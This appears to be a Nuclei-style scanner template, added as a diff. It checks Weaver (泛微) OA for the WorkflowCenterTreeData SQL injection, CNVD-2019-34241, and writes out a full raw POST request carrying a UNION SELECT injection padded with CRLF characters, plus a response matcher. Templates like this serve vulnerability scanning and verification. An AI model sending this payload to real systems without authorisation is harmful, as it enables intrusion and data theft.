@@ -1,0 +1,27 @@
+id: poc-yaml-weaver-workflowcenter-sqli
+info:
+  name: 泛微OA WorkflowCenterTreeData SQL注入漏洞(CNVD-2019-34241)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: CNVD-2019-34241,sql-injection
+  description: |
+    The WorkflowCenterTreeData endpoint of 泛微OA is vulnerable to SQL injection, allowing unauthorized access to sensitive data.
+
+variables:
+  r_empty: "{{repeat('\\r\\n', 400)}}"
+
+http:
+  - raw:
+      - |
+        POST /mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        formids=11111111111))){{r_empty}}union select 111,'ccc' from v$parameter order by (((1
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"id":"wf_111","text":"ccc"'
